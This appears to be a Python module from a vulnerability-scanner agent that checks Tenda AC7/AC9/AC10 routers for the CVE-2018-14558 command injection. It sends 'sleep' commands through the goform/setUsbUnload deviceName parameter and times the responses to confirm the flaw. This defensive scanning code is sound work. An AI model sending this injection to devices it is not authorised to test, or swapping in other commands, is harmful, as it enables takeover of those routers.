"""Agent Asteroid implementation for CVE-2018-14558"""

from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Tenda AC7, AC9, and AC10 Routers Command Injection Vulnerability"
VULNERABILITY_REFERENCE = "CVE-2018-14558"
VULNERABILITY_DESCRIPTION = (
    "An issue was discovered on Tenda AC7 devices with firmware through V15.03.06.44_CN(AC7), "
    "AC9 devices with firmware through V15.03.05.19(6318)_CN(AC9), and AC10 devices with firmware "
    "through V15.03.06.23_CN(AC10). A command Injection vulnerability allows attackers to execute "
    "arbitrary OS commands via a crafted goform/setUsbUnload request. This occurs because the "
    '"formsetUsbUnload" function executes a dosystemCmd function with untrusted input.'
)

DEFAULT_TIMEOUT = 90
TARGET_PATH = "/goform/setUsbUnload/.js?deviceName=A;"
MAX_DELAY_DIFFERENCE = 5
DELAYS = [30, 40, 50, 60]


@exploits_registry.register
class CVE201814558Exploit(definitions.Exploit):
    """CVE-2018-14558: Tenda AC7, AC9, and AC10 Routers Command Injection Vulnerability"""

    def accept(self, target: definitions.Target) -> bool:
        try:
            resp = self.session.get(target.origin, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return resp.status_code == 200

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        for delay in DELAYS:
            try:
                resp = self.session.get(target.origin + TARGET_PATH + f"sleep {delay}")
            except requests_exceptions.RequestException:
                return []
            elapsed = resp.elapsed.seconds
            if elapsed < delay or elapsed - delay > MAX_DELAY_DIFFERENCE:
                return []

        vulnerability = self._generate_vulnerability_object(target.origin)
        return [vulnerability]

    def _generate_vulnerability_object(
        self, target_uri: str
    ) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}"
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target_uri} is vulnerable to {VULNERABILITY_REFERENCE},"
            f" {VULNERABILITY_TITLE}."
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability
